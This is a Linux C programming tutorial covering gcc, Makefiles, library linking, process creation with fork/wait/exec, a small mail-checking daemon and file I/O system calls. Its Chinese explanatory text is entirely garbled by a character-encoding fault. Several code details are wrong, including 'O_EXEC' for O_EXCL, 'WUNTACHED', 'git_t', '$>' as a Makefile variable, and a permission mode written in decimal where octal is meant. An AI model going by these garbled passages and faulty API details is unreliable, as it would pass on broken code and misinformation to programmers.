linux����ϵͳ��c���Ա������ 
�����д��007xiong 
ԭ�ģ�Hoyt�� 
��FreeBSD�²���ע��:С��
(һ)Ŀ¼���� 
1)Linux�����������--����֪ʶ 
2)Linux�����������--���̽��� 
3)Linux�����������--�ļ����� 
4)Linux�����������--ʱ����� 
5)Linux�����������--�źŴ��� 
6)Linux�����������--��Ϣ���� 
7)Linux�����������--�̲߳��� 
8)Linux�����������--������ 
9)Linux��C�������߽��� 

(��)�������� 
1)Linux�����������--����֪ʶ 
Linux��C���Ա�̻���֪ʶ 
ǰ��: 
��ƪ���½�����LINUX�½���C���Ա������Ҫ�Ļ���֪ʶ.����ƪ���µ���,���ǽ� 
��ѧ����������: 
Դ������� 
Makefile�ı�д 
���������� 
����ĵ��� 
ͷ�ļ���ϵͳ���� 
---------------------------------------------------------------------------- 
---- 
1.Դ����ı��� 
��Linux����,���Ҫ����һ��C����Դ����,����Ҫʹ��GNU��gcc������. �������� 
��һ��ʵ����˵�����ʹ��gcc������. 
��������������һ���ǳ��򵥵�Դ����(hello.c): 
int main(int argc,char **argv) 
{ 
	printf("Hello Linux\n"); 
} 
Ҫ�����������,����ֻҪ����������ִ��: 
gcc -o hello hello.c 
gcc �������ͻ�Ϊ��������һ��hello�Ŀ�ִ���ļ�.ִ��./hello�Ϳ��Կ����������� 
�����.�������� gcc��ʾ��������gcc���������ǵ�Դ����,-o ѡ���ʾ����Ҫ����� 
������������Ŀ�ִ���ļ���Ϊhello ��hello.c�����ǵ�Դ�����ļ�. 
gcc�����������ѡ��,һ����˵����ֻҪ֪�����еļ����͹���. -oѡ�������Ѿ�֪�� 
��,��ʾ����Ҫ������Ŀ�ִ���ļ���. -cѡ���ʾ����ֻҪ����������Ŀ�����,�� 
����Ҫ�����ִ���ļ�. -gѡ���ʾ����Ҫ��������ڱ����ʱ���ṩ�����Ժ�Գ��� 
���е��Ե���Ϣ. 
֪����������ѡ��,���ǾͿ��Ա��������Լ���д�ļ򵥵�Դ������,�������Ҫ֪���� 
���ѡ��,���Բ鿴gcc�İ����ĵ�,����������������ѡ�����ϸ˵��. 
2.Makefile�ı�д 
��������������������һ������,Դ��������: 
/* main.c */ 
#include "mytool1.h" 
#include "mytool2.h" 
int main(int argc,char **argv) 
{ 
mytool1_print("hello"); 
mytool2_print("hello"); 
} 
/* mytool1.h */ 
#ifndef _MYTOOL_1_H 
#define _MYTOOL_1_H 
void mytool1_print(char *print_str); 
#endif 
/* mytool1.c */ 
#include "mytool1.h" 
void mytool1_print(char *print_str) 
{ 
printf("This is mytool1 print %s\n",print_str); 
} 
/* mytool2.h */ 
#ifndef _MYTOOL_2_H 
#define _MYTOOL_2_H 
void mytool2_print(char *print_str); 
#endif 
/* mytool2.c */ 
#include "mytool2.h" 
void mytool2_print(char *print_str) 
{ 
printf("This is mytool2 print %s\n",print_str); 
} 
��Ȼ������������Ǻ̵ܶ����ǿ������������� 
gcc -c main.c 
gcc -c mytool1.c 
gcc -c mytool2.c 
gcc -o main main.o mytool1.o mytool2.o 
�����Ļ�����Ҳ���Բ���main����,����Ҳ��ʱ���鷳.����������ǿ���һ�������һ 
�������޸������е�һ���ļ�(����˵mytool1.c)��ô�����ѵ���Ҫ����������������� 
?Ҳ�����˵,��������׽����,��дһ��SHELL�ű�,��������ȥ��ɲ��Ϳ�����.�ǵ� 
�������������˵,�ǿ��������õ�.���ǵ����ǰ�������ĸ�����һ��,������ǵĳ� 
���м��ٸ�Դ�����ʱ��,�ѵ�ҲҪ����������һ��һ����ȥ����? 
Ϊ��,�����ĳ���Ա�������һ���ܺõĹ��������������,�����make.����ֻҪִ���� 
��make,�Ϳ��԰��������������.������ִ��make֮ǰ,����Ҫ�ȱ�дһ���ǳ���Ҫ�� 
�ļ�.--Makefile.����������Ǹ�������˵,���ܵ�һ��Makefile���ļ���: 
# ���������Ǹ������Makefile�ļ� 
main:main.o mytool1.o mytool2.o 
gcc -o main main.o mytool1.o mytool2.o 
main.o:main.c mytool1.h mytool2.h 
gcc -c main.c 
mytool1.o:mytool1.c mytool1.h 
gcc -c mytool1.c 
mytool2.o:mytool2.c mytool2.h 
gcc -c mytool2.c 
�������Makefile�ļ�,��������ʲôʱ���޸���Դ�����е�ʲô�ļ�,����ֻҪִ�� 
make����,���ǵı�������ֻ��ȥ����������޸ĵ��ļ��йص��ļ�,�������ļ������� 
������ȥ���. 
��������ѧϰMakefile����α�д��. 
��Makefile��Ҳ#��ʼ���ж���ע����.Makefile������Ҫ���������ļ���������ϵ��˵ 
��.һ��ĸ�ʽ��: 
target: components 
TAB rule 
��һ�б�ʾ����������ϵ.�ڶ����ǹ���. 
����˵����������Ǹ�Makefile�ļ��ĵڶ��� 
main:main.o mytool1.o mytool2.o 
��ʾ���ǵ�Ŀ��(target)main����������(components)��main.o mytool1.o mytool2.o 
�������Ķ�����Ŀ���޸ĺ��޸ĵĻ�,��Ҫȥִ�й���һ����ָ��������.�������ǵ��� 
���Ǹ�Makefile��������˵��һ��Ҫִ�� gcc -o main main.o mytool1.o mytool2.o 
ע�����һ���е�TAB��ʾ������һ��TAB�� 
Makefile�������ǳ����õı���.�ֱ���$@,$>,$<���������ֱ���: 
$@--Ŀ���ļ�,$^--���е������ļ�,$<--��һ�������ļ�. 
�������ʹ��������������,��ô���ǿ��Լ����ǵ�Makefile�ļ�Ϊ: 
# ���Ǽ򻯺��Makefile 
main:main.o mytool1.o mytool2.o 
gcc -o $@ $> 
main.o:main.c mytool1.h mytool2.h 
gcc -c $< 
mytool1.o:mytool1.c mytool1.h 
gcc -c $< 
mytool2.o:mytool2.c mytool2.h 
gcc -c $< 
�����򻯺����ǵ�Makefile�Ǽ���һ��,����������ʱ�����һ��.��������ѧϰ 
һ��Makefile��ȱʡ���� 
..c.o: 
gcc -c $< 
��������ʾ���е� .o�ļ�������������Ӧ��.c�ļ���.����mytool.o������mytool.c 
����Makefile�����Ա�Ϊ: 
# ������һ�μ򻯺��Makefile 
main:main.o mytool1.o mytool2.o 
gcc -o $@ $^ 
..c.o: 
gcc -c $< 
����,���ǵ�Makefile Ҳ�����,�����֪������Ĺ���Makefile������Բ鿴��Ӧ�� 
�ĵ�. 
3.���������� 
���ű�������������� 
/* temp.c */ 
#include <math.h> 
int main(int argc,char **argv) 
{ 
double value; 
printf("Value:%f\n",value); 
} 
��������൱��,���ǵ������� gcc -o temp temp.c ����ʱ�����������ʾ�Ĵ���. 

/tmp/cc33Kydu.o: In function `main': 
/tmp/cc33Kydu.o(.text+0xe): undefined reference to `log' 
collect2: ld returned 1 exit status 
���������������Ϊ�������Ҳ���log�ľ���ʵ��.��Ȼ���ǰ�������ȷ��ͷ�ļ�,������ 
���ڱ����ʱ����Ҫ����ȷ���Ŀ�.��Linux��,Ϊ��ʹ����ѧ����,���Ǳ������ѧ�� 
����,Ϊ������Ҫ���� -lm ѡ��. gcc -o temp temp.c -lm�������ܹ���ȷ�ı���.Ҳ�� 
����Ҫ��,ǰ��������printf������ʱ����ôû�����ӿ���?��������,����һЩ���õĺ� 
����ʵ��,gcc���������Զ�ȥ����һЩ���ÿ�,�������Ǿ�û�б�Ҫ�Լ�ȥָ����. ��ʱ 
�������ڱ�������ʱ��Ҫָ�����·��,���ʱ������Ҫ�õ��������� -Lѡ��ָ�� 
·��.����˵������һ������ /home/hoyt/mylib��,�������Ǳ����ʱ��Ҫ���� -L/h 
ome/hoyt/mylib.����һЩ��׼����˵,����û�б�Ҫָ��·��.ֻҪ��������ȱʡ���· 
���¾Ϳ�����.ϵͳ��ȱʡ���·��/lib /usr/lib /usr/local/lib ��������·������ 
�Ŀ�,���ǿ��Բ�ָ��·��. 
����һ������,��ʱ������ʹ����ĳ������,�������ǲ�֪���������,���ʱ����ô���� 
?�ܱ�Ǹ,�������������Ҳ��֪����,��ֻ��һ��ɵ�취.����,�ҵ���׼��·������ȥ 
�ҿ�����û�к����õĺ�����صĿ�,�Ҿ������ҵ����߳�(thread)�����Ŀ��ļ�(libp 
thread.a). ��Ȼ,����Ҳ���,ֻ��һ��������.������Ҫ��sin����������ڵĿ�. ��ֻ 
���� nm -o /lib/*.so|grep sin>~/sin ����,Ȼ��~/sin�ļ�,��������ȥ����. ��s 
in�ļ�����,�һ��ҵ�������һ��libm-2.1.2.so:00009fa0 W sin �����Ҿ�֪����sin�� 
libm-2.1.2.so������,���� -lmѡ��Ϳ�����(ȥ��ǰ���lib�ͺ���İ汾��־,��ʣ 
��m�������� -lm). �����֪����ô��,��Ͽ������,�һطǳ��м���.лл! 
4.����ĵ��� 
���Ǳ�д�ĳ���̫����һ���Ծͻ�ɹ���,�����ǵĳ�����,������������� 
���벻���Ĵ���,���ʱ�����Ǿ�Ҫ�����ǵĳ�����е�����. 
��õĵ��������gdb.���������ͼ�ν����µ��Գ���,��ô�����ڿ���ѡ��xxgdb.�� 
��Ҫ�ڱ����ʱ����� -gѡ��.����gdb��ʹ�ÿ��Կ�gdb�İ����ļ�.������û���ù��� 
�����,������Ҳ���ܹ�˵�����ʹ��. �����Ҳ�ϲ����gdb.����һ�������Ǻܷ������� 
,��һ�����ڳ���������м������ֵ�����Գ����.��Ȼ�����ѡ���Լ��İ취,û�� 
��Ҫȥѧ���˵�.�����������IDE����,�����Ѿ��Լ����˵�������.�����ѡ�񼸸��� 
һ���ҳ��Լ�ϲ����һ����. 
5.ͷ�ļ���ϵͳ���� 
��ʱ������ֻ֪��һ�������Ĵ����ʽ,���ǵ�ȷ�еı��ʽ,�����ǲ��ǵ��ź��� 
���Ǹ�ͷ�ļ�������˵��.���ʱ�����ǿ�������ϵͳ. 
����˵������֪��fread���������ȷ����ʽ,����ֻҪִ�� man fread ϵͳ�ͻ������ 
��������ϸ���͵�.������������ڵ�ͷ�ļ�<stdio.h>˵����. �������Ҫwrite����� 
����˵��,������ִ��man writeʱ,����Ľ��ȴ������������Ҫ��. ��Ϊ����Ҫ����w 
rite���������˵��,���ǳ�����ȴ��write��������˵��.Ϊ�˵õ�write�ĺ���˵�� 
����Ҫ�� man 2 write. 2��ʾ�����õ�write���������ϵͳ���ú���,����һ�����ǳ� 
�õ���3��ʾ������C�Ŀ⺯��. 
��ס����ʲôʱ��,man�������ǵ��������. 
------------------------------------------------------------------------ 
����,��һ�¾ͽ���ô����,������Щ֪ʶ���ǾͿ��Խ��뼤�����ĵ�Linux�µ�C����̽ 
�ջ. 

2)Linux�����������--���̽��� 
Linux�½��̵Ĵ��� 
ǰ��: 
��ƪ����������������Linux�ºͽ�����صĸ�������.���ǽ���ѧ��: 
���̵ĸ��� 
���̵���� 
���̵Ĵ��� 
�ػ����̵Ĵ��� 
---------------------------------------------------------------------------- 
---- 
1�����̵ĸ��� 
Linux����ϵͳ��������û���.��ͬһʱ�����������û������ϵͳ���������� 
��.��ô����ϵͳ����ôʵ�ֶ��û��Ļ�����? ���ִ��Ĳ���ϵͳ����,���г���ͽ��� 
�ĸ���.��ôʲô�ǳ���,ʲô�ǽ�����? ͨ�׵Ľ�������һ����������ִ�д�����ļ� 
,��һ����̬���ļ�.��������һ����ʼִ�е��ǻ�û�н����ĳ����ʵ��.���ǿ�ִ���� 
���ľ���ʵ��. һ�����������������,��ÿһ�������ֿ���������ӽ���.����ѭ�� 
��ȥ,�������������. ������ϵͳ���õ��ڴ��Ժ�,ϵͳ����������һ������Դ(�� 
��,�豸�ȵ�)Ȼ�����һϵ�еĸ��Ӳ���,ʹ�����ɽ����Թ�ϵͳ����.��ϵͳ����ֻ 
�н���û�г���,Ϊ�����ָ�����ͬ�Ľ���,ϵͳ��ÿһ�����̷�����һ��ID(�������ǵ� 
���֤)�Ա�ʶ��. Ϊ�˳�ֵ�������Դ,ϵͳ���Խ��������˲�ͬ��״̬.�����̷�Ϊ�� 
��,����,����,������������״̬. �½���ʾ�������ڱ�����,�����ǽ�����������,�� 
���ǽ������ڵȴ�ĳһ���¼�����,�����Ǳ�ʾϵͳ���ڵȴ�CPU��ִ������,����ɱ�ʾ 
�����Ѿ�������ϵͳ���ڻ�����Դ. ���ڽ������״̬����ϸ��˵���ǿ��Կ�������ϵ 
ͳ����������ϸ�Ľ�˵�� 
2�����̵ı�־ 
��������֪���˽��̶���һ��ID,��ô������ô�õ����̵�ID��?ϵͳ����getpid�� 
�Եõ����̵�ID,��getppid���Եõ�������(�������øú������̵Ľ���)��ID. 
#include <unistd> 
pid_t getpid(void); 
pid_t getppid(void); 
������Ϊ��������,��������Ϊ���û������.ϵͳΪ���ҵ����̵��û���,��Ϊ���̺� 
�û�������ϵ.����û���Ϊ���̵�������.��Ӧ��ÿһ���û�Ҳ��һ���û�ID.ͨ��ϵͳ 
����getuid���Եõ����̵������ߵ�ID.���ڽ���Ҫ�õ�һЩ��Դ,��Linux��ϵͳ��Դ�� 
���б�����,Ϊ�˻�ȡһ����Դ���̻���һ����Ч�û�ID.���ID��ϵͳ����Դʹ���й� 
,�漰�����̵�Ȩ��. ͨ��ϵͳ����geteuid���ǿ��Եõ����̵���Ч�û�ID. ���û�ID 
���Ӧ���̻���һ����ID����Ч��IDϵͳ����getgid��getegid���Էֱ�õ���ID����Ч 
��ID 
#include <unistd> 
#include <sys/types.h> 

uid_t getuid(void); 
uid_t geteuid(void); 
gid_t getgid(void); 
git_t getegid(void); 
��ʱ�����ǻ�����û���������Ϣ����Ȥ(��¼���ȵ�),���ʱ�����ǿ��Ե���getpwui 
d���õ�. 
struct passwd { 
char *pw_name; /* ��¼���� */ 
char *pw_passwd; /* ��¼���� */ 
uid_t pw_uid; /* �û�ID */ 
gid_t pw_gid; /* �û���ID */ 
char *pw_gecos; /* �û������� */ 
char *pw_dir; /* �û���Ŀ¼ */ 
char *pw_shell; /* �û���SHELL */ 
}; 
#include <pwd.h> 
#include <sys/types.h> 

struct passwd *getpwuid(uid_t uid); 
��������ѧϰһ��ʵ����ʵ��һ������������ѧϰ�ļ�������: 
#include <unistd.h> 
#include <pwd.h> 
#include <sys/types.h> 
#include <stdio.h> 
int main(int argc,char **argv) 
{ 
pid_t my_pid,parent_pid; 
uid_t my_uid,my_euid; 
gid_t my_gid,my_egid; 
struct passwd *my_info; 
my_pid=getpid(); 
parent_pid=getppid(); 
my_uid=getuid(); 
my_euid=geteuid(); 
my_gid=getgid(); 
my_egid=getegid(); 
my_info=getpwuid(my_uid); 
printf("Process ID:%ld\n",my_pid); 
printf("Parent ID:%ld\n",parent_pid); 
printf("User ID:%ld\n",my_uid); 
printf("Effective User ID:%ld\n",my_euid); 
printf("Group ID:%ld\n",my_gid); 
printf("Effective Group ID:%ld\n",my_egid); 
if(my_info) 
{ 
printf("My Login Name:%s\n" ,my_info->pw_name); 
printf("My Password :%s\n" ,my_info->pw_passwd); 
printf("My User ID :%ld\n",my_info->pw_uid); 
printf("My Group ID :%ld\n",my_info->pw_gid); 
printf("My Real Name:%s\n" ,my_info->pw_gecos); 
printf("My Home Dir :%s\n", my_info->pw_dir); 
printf("My Work Shell:%s\n", my_info->pw_shell); 
} 
} 
3�����̵Ĵ��� 
����һ�����̵�ϵͳ���úܼ�.����ֻҪ����fork�����Ϳ�����. 
#include <unistd.h> 

pid_t fork(); 
��һ�����̵�����fork�Ժ�,ϵͳ�ᴴ��һ���ӽ���.����ӽ��̺͸����̲�ͬ�ĵط�ֻ 
�����Ľ���ID�͸�����ID,�����Ķ���һ��.��������̿�¡(clone)�Լ�һ��.��Ȼ���� 
����һģһ���Ľ�����û�������.Ϊ�����ָ����̺��ӽ���,���Ǳ������fork�ķ��� 
ֵ. ��fork����ʧ�ܵ�ʱ��(�ڴ治��������û������������ѵ�)fork����-1,����f 
ork�ķ���ֵ����Ҫ������.���ڸ�����fork�����ӽ��̵�ID,������fork�ӽ��̷���0.�� 
�Ǿ��Ǹ����������ֵ�����ָ��ӽ��̵�. ������ΪʲôҪ�����ӽ�����?ǰ�������Ѿ� 
˵����Linux��һ�����û�����ϵͳ,��ͬһʱ����������û�������ϵͳ����Դ.��ʱ 
����Ϊ����һ���������ʹ����ӽ�����������Դ. һ���ӽ��̱�����,���ӽ���һ��� 
fork������ִ��,�໥����ϵͳ����Դ.��ʱ������ϣ���ӽ��̼���ִ��,������������ֱ 
���ӽ����������.���ʱ�����ǿ��Ե���wait����waitpidϵͳ����. 
#include <sys/types.h> 
#include <sys/wait.h> 

pid_t wait(int *stat_loc); 
pid_t waitpid(pid_t pid,int *stat_loc,int options); 
waitϵͳ���û�ʹ����������ֱ��һ���ӽ��̽��������Ǹ����̽��ܵ���һ���ź�.��� 
û�и�����û���ӽ��̻��������ӽ����Ѿ�������wait����������.�ɹ�ʱ(��һ���ӽ� 
�̽���)wait�������ӽ��̵�ID,���򷵻�-1,������ȫ�ֱ���errno.stat_loc���ӽ��̵� 
�˳�״̬.�ӽ��̵���exit,_exit ������return���������ֵ. Ϊ�˵õ����ֵLinux�� 
���˼������������������ֵ. 
WIFEXITED:�ж��ӽ����˳�ֵ�Ƿ�0 
WEXITSTATUS:�ж��ӽ��̵��˳�ֵ(���ӽ����˳�ʱ��0). 
WIFSIGNALED:�ӽ���������û�л�õ��źŶ��˳�. 
WTERMSIG:�ӽ���û�л�õ��źź�(��WIFSIGNALEDΪ��ʱ��������). 
waitpid�ȴ�ָ�����ӽ���ֱ���ӽ��̷���.���pidΪ��ֵ��ȴ�ָ���Ľ���(pid).��� 
Ϊ0��ȴ��κ�һ����ID�͵����ߵ���ID��ͬ�Ľ���.Ϊ-1ʱ��ͬ��wait����.С��-1ʱ�� 
���κ�һ����ID����pid����ֵ�Ľ���. stat_loc��wait������һ��. options���Ծ��� 
�����̵�״̬.����ȡ����ֵ WNOHANG:�������������ص�û���ӽ��̴���ʱ. WUNTACHE 
D:���ӽ��̽���ʱwaitpid����,�����ӽ��̵��˳�״̬���ɵõ�. 
�����̴����ӽ��̺�,�ӽ���һ��Ҫִ�в�ͬ�ĳ���.Ϊ�˵���ϵͳ����,���ǿ���ʹ��ϵ 
ͳ����exec�����.exec���������5������. 
#include <unistd.h> 
int execl(const char *path,const char *arg,...); 
int execlp(const char *file,const char *arg,...); 
int execle(const char *path,const char *arg,...); 
int execv(const char *path,char *const argv[]); 
int execvp(const char *file,char *const argv[]): 
exec����ÿ���ִ�и�������.����exec����õ���ϸ��˵���Բο�ϵͳ�ֲ�(man exec 
l). ����������ѧϰһ��ʵ��.ע������ʱ��Ҫ�� -lm�Ա�������ѧ������. 
#include <unistd.h> 
#include <sys/types.h> 
#include <sys/wait.h> 
#include <stdio.h> 
#include <errno.h> 
#include <math.h> 
void main(void) 
{ 
pid_t child; 
int status; 
printf("This will demostrate how to get child status\n"); 
if((child=fork())==-1) 
{ 
printf("Fork Error :%s\n",strerror(errno)); 
exit(1); 
} 
else if(child==0) 
{ 
int i; 
printf("I am the child:%ld\n",getpid()); 
for(i=0;i<1000000;i++) sin(i); 
i=5; 
printf("I exit with %d\n",i); 
exit(i); 
} 
while(((child=wait(&status))==-1)&(errno==EINTR)); 
if(child==-1) 
printf("Wait Error:%s\n",strerror(errno)); 
else if(!status) 
printf("Child %ld terminated normally return status is zero\n", 
child); 
else if(WIFEXITED(status)) 
printf("Child %ld terminated normally return status is %d\n", 
child,WEXITSTATUS(status)); 
else if(WIFSIGNALED(status)) 
printf("Child %ld terminated due to signal %d znot caught\n", 
child,WTERMSIG(status)); 
} 
strerror�����᷵��һ��ָ���Ĵ���ŵĴ�����Ϣ���ַ���. 
4���ػ����̵Ĵ��� 
�������DOSʱ����д������,��ô��Ҳ��֪����DOS��Ϊ�˱�дһ����פ�ڴ�ĳ��� 
����Ҫ��д���ٴ�����.�෴�����Linux�±�дһ��"��פ�ڴ�"�ĳ���ȴ�Ǻ����׵�.�� 
��ֻҪ���д���Ϳ�������. ʵ��������Linux�Ƕ��������ϵͳ,���Ǿ��ǲ���д���� 
Ҳ���԰�һ������ŵ���̨ȥִ�е�.����ֻҪ������������&����SHELL�ͻ�����ǵ� 
����ŵ���̨ȥ���е�. ��������"����"һ����̨����ʼ��ĳ���.�������ÿ��һ��ָ 
����ʱ���ȥ������ǵ�����,��������������ʼ���,�᲻�ϵı���(ͨ�������ϵ�С�� 
������������). ��������������ļ�ǿ�汾��ǿ�汾 
��̨���̵Ĵ���˼��: ���ȸ����̴���һ���ӽ���.Ȼ���ӽ���ɱ��������(�ǲ��Ǻ��� 
��?). �źŴ������еĹ������ӽ���������. 
#include <unistd.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <stdio.h> 
#include <errno.h> 
#include <fcntl.h> 
#include <signal.h> 
/* Linux ��Ĭ�θ��˵������ַ�� /var/spool/mail/�û��ĵ�¼�� */ 
#define MAIL "/var/spool/mail/hoyt" 
/* ˯��10���� */ 

#define SLEEP_TIME 10 
main(void) 
{ 
pid_t child; 
if((child=fork())==-1) 
{ 
printf("Fork Error:%s\n",strerror(errno)); 
exit(1); 
} 
else if(child>0) 
while(1); 
if(kill(getppid(),SIGTERM)==-1) 
{ 
printf("Kill Parent Error:%s\n",strerror(errno)); 
exit(1); 
} 
{ 
int mailfd; 
while(1) 
{ 
if((mailfd=open(MAIL,O_RDONLY))!=-1) 
{ 
fprintf(stderr,"%s","\007"); 
close(mailfd); 
} 
sleep(SLEEP_TIME); 
} 
} 
} 
�������Ĭ�ϵ�·���´�����������ļ�,Ȼ�����һ���������.��Ȼ��������к� 
��ط�Ҫ���Ƶ�.���Ǻ��������С������Ƶ�,�ٿ��ҵĸ���֮ǰ����Գ����Լ��� 
��һ��.�������û�ָ�������·����˯��ʱ��ȵ�.�����Լ�����������.���ְ�,�¸� 
��̽����. 
���˽���һ�ڵ��������Ǿ���ѧ��������.������һ���ǳ���Ҫ�ĸ���,���ĳ��򶼻� 
���ӽ���.����һ���ӽ�����ÿһ������Ա�Ļ���Ҫ��! 

3)Linux�����������--�ļ����� 
Linux���ļ��Ĳ��� 
ǰ��: 
��������һ�ڽ�Ҫ����linux���ļ������ĸ�������. 
�ļ��Ĵ����Ͷ�д 
�ļ��ĸ������� 
Ŀ¼�ļ��Ĳ��� 
�ܵ��ļ� 
---------------------------------------------------------------------------- 
---- 
1���ļ��Ĵ����Ͷ�д 
�Ҽ������Ѿ�֪���˱�׼�����ļ������ĸ�������(fopen,fread,fwrite�ȵ�).��Ȼ 
����㲻����Ļ�Ҳ��Ҫ�ż�.�������۵�ϵͳ�����ļ�����ʵ������Ϊ��׼���ļ����� 
�����. 
��������Ҫ��һ���ļ����ж�д������ʱ��,���ǿ���ʹ��ϵͳ���ú���open.ʹ���� 
���Ժ����ǵ�������һ��close�������йرղ���. 
#include <fcntl.h> 
#include <unistd.h> 
#include <sys/types.h> 
#include <sys/stat.h> 

int open(const char *pathname,int flags); 
int open(const char *pathname,int flags,mode_t mode); 
int close(int fd); 
open������������ʽ.����pathname������Ҫ�򿪵��ļ���(����·������,ȱʡ����Ϊ�� 
��ǰ·������).flags����ȥ�����һ��ֵ�����Ǽ���ֵ�����. 
O_RDONLY:��ֻ���ķ�ʽ���ļ�. 
O_WRONLY:��ֻд�ķ�ʽ���ļ�. 
O_RDWR:�Զ�д�ķ�ʽ���ļ�. 
O_APPEND:��׷�ӵķ�ʽ���ļ�. 
O_CREAT:����һ���ļ�. 
O_EXEC:���ʹ����O_CREAT�����ļ��Ѿ�����,�ͻᷢ��һ������. 
O_NOBLOCK:�Է������ķ�ʽ��һ���ļ�. 
O_TRUNC:����ļ��Ѿ�����,��ɾ���ļ�������. 
ǰ��������־ֻ��ʹ�������һ��.���ʹ����O_CREATE��־,��ô����Ҫʹ��open�ĵ� 
������ʽ.��Ҫָ��mode��־,������ʾ�ļ��ķ���Ȩ��.mode������������������. 
----------------------------------------------------------------- 
S_IRUSR �û����Զ� S_IWUSR �û�����д 
S_IXUSR �û�����ִ�� S_IRWXU �û����Զ�дִ�� 
----------------------------------------------------------------- 
S_IRGRP ����Զ� S_IWGRP �����д 
S_IXGRP �����ִ�� S_IRWXG ����Զ�дִ�� 
----------------------------------------------------------------- 
S_IROTH �����˿��Զ� S_IWOTH �����˿���д 
S_IXOTH �����˿���ִ�� S_IRWXO �����˿��Զ�дִ�� 
----------------------------------------------------------------- 
S_ISUID �����û�ִ��ID S_ISGID �������ִ��ID 
----------------------------------------------------------------- 
����Ҳ�������������������λ�ı�־.Linux�ܹ���5����������ʾ�ļ��ĸ���Ȩ��. 
00000.��һλ��ʾ�����û�ID.�ڶ�λ��ʾ������ID,����λ��ʾ�û��Լ���Ȩ��λ,���� 
λ��ʾ���Ȩ��,���һλ��ʾ�����˵�Ȩ��. 
ÿ�����ֿ���ȡ1(ִ��Ȩ��),2(дȨ��),4(��Ȩ��),0(ʲôҲû��)�������⼸��ֵ�ĺ� 
.. 
��������Ҫ����һ���û���дִ��,��û��Ȩ��,�����˶�ִ�е��ļ�.�����û�IDλ��ô 
���ǿ���ʹ�õ�ģʽ��--1(�����û�ID)0(��û������)7(1+2+4)0(û��Ȩ��,ʹ��ȱʡ) 
5(1+4)��10705: 
open("temp",O_CREAT,10705); 
������Ǵ��ļ��ɹ�,open�᷵��һ���ļ�������.�����Ժ���ļ������в����Ϳ��� 
������ļ����������в�����. 
�����ǲ�������Ժ�,����Ҫ�ر��ļ���,ֻҪ����close�Ϳ�����,����fd������Ҫ�ر� 
���ļ�������. 
�ļ������Ժ�,���Ǿ�Ҫ���ļ����ж�д��.���ǿ��Ե��ú���read��write�����ļ��� 
��д. 
#include <unistd.h> 
ssize_t read(int fd, void *buffer,size_t count); 
ssize_t write(int fd, const void *buffer,size_t count); 
fd������Ҫ���ж�д�������ļ�������,buffer������Ҫд���ļ����ݻ�����ļ����ݵ� 
�ڴ��ַ.count������Ҫ��д���ֽ���. 
������ͨ���ļ�read��ָ�����ļ�(fd)�ж�ȡcount�ֽڵ�buffer��������(��ס���Ǳ� 
���ṩһ���㹻��Ļ�����),ͬʱ����count. 
���read�������ļ��Ľ�β���߱�һ���ź����ж�,����ֵ��С��count.��������ź��� 
�����𷵻�,����û�з�������,read�᷵��-1,������errnoΪEINTR.������������ļ� 
��β��ʱ��,read�᷵��0. 
write��buffer��дcount�ֽڵ��ļ�fd��,�ɹ�ʱ����ʵ����д���ֽ���. 
��������ѧϰһ��ʵ��,���ʵ�����������ļ�. 
#include <unistd.h> 
#include <fcntl.h> 
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <errno.h> 
#include <string.h> 
#define BUFFER_SIZE 1024 
int main(int argc,char **argv) 
{ 
int from_fd,to_fd; 
int bytes_read,bytes_write; 
char buffer[BUFFER_SIZE]; 
char *ptr; 
if(argc!=3) 
{ 
fprintf(stderr,"Usage:%s fromfile tofile\n\a",argv[0]); 
exit(1); 
} 
/* ��Դ�ļ� */ 
if((from_fd=open(argv[1],O_RDONLY))==-1) 
{ 
fprintf(stderr,"Open %s Error:%s\n",argv[1],strerror(errno)); 
exit(1); 
} 
/* ����Ŀ���ļ� */ 
if((to_fd=open(argv[2],O_WRONLY|O_CREAT,S_IRUSR|S_IWUSR))==-1) 
{ 
fprintf(stderr,"Open %s Error:%s\n",argv[2],strerror(errno)); 
exit(1); 
} 
/* ���´�����һ������Ŀ����ļ��Ĵ��� */ 
while(bytes_read=read(from_fd,buffer,BUFFER_SIZE)) 
{ 
/* һ�������Ĵ������� */ 
if((bytes_read==-1)&&(errno!=EINTR)) break; 
else if(bytes_read>0) 
{ 
ptr=buffer; 
while(bytes_write=write(to_fd,ptr,bytes_read)) 
{ 
/* һ�������������� */ 
if((bytes_write==-1)&&(errno!=EINTR))break; 
/* д�������ж����ֽ� */ 
else if(bytes_write==bytes_read) break; 
/* ֻд��һ����,����д */ 
else if(bytes_write>0) 
{ 
ptr+=bytes_write; 
bytes_read-=bytes_write; 
} 
} 
/* д��ʱ�������������� */ 
if(bytes_write==-1)break; 
} 
} 
close(from_fd); 
close(to_fd); 
exit(0); 
} 
2���ļ��ĸ������� 
�ļ����и��ָ���������,��������������֪�����ļ�Ȩ������,�ļ����д���ʱ�� 
,��С�ȵ�����. 
��ʱ������Ҫ�ж��ļ��Ƿ���Խ���ĳ�ֲ���(��,д�ȵ�).���ʱ�����ǿ���ʹ��acce 
ss����. 
#include <unistd.h> 

int access(const char *pathname,int mode); 
pathname:���ļ�����,mode������Ҫ�жϵ�����.����ȡ����ֵ���������ǵ����. 
R_OK�ļ����Զ�,W_OK�ļ�����д,X_OK�ļ�����ִ��,F_OK�ļ�����.�����ǲ��Գɹ�ʱ 
,��������0,���������һ����������ʱ,����-1. 
�������Ҫ����ļ�����������,���ǿ���ʹ�ú���stat����fstat. 
#include <sys/stat.h> 
#include <unistd.h> 
int stat(const char *file_name,struct stat *buf); 
int fstat(int filedes,struct stat *buf); 
struct stat { 
dev_t st_dev; /* �豸 */ 
ino_t st_ino; /* �ڵ� */ 
mode_t st_mode; /* ģʽ */ 
nlink_t st_nlink; /* Ӳ���� */ 
uid_t st_uid; /* �û�ID */ 
gid_t st_gid; /* ��ID */ 
dev_t st_rdev; /* �豸���� */ 
off_t st_off; /* �ļ��ֽ��� */ 
unsigned long st_blksize; /* ���С */ 
unsigned long st_blocks; /* ���� */ 
time_t st_atime; /* ���һ�η���ʱ�� */ 
time_t st_mtime; /* ���һ���޸�ʱ�� */ 
time_t st_ctime; /* ���һ�θı�ʱ��(ָ����) */ 
}; 
stat�����ж�û�д򿪵��ļ�,��fstat�����жϴ򿪵��ļ�.����ʹ������������st_ 
mode.ͨ�����������ǿ����жϸ������ļ���һ����ͨ�ļ�����һ��Ŀ¼,���ӵȵ�.���� 
ʹ�����漸�������ж�. 
S_ISLNK(st_mode):�Ƿ���һ������.S_ISREG�Ƿ���һ�������ļ�.S_ISDIR�Ƿ���һ��Ŀ 
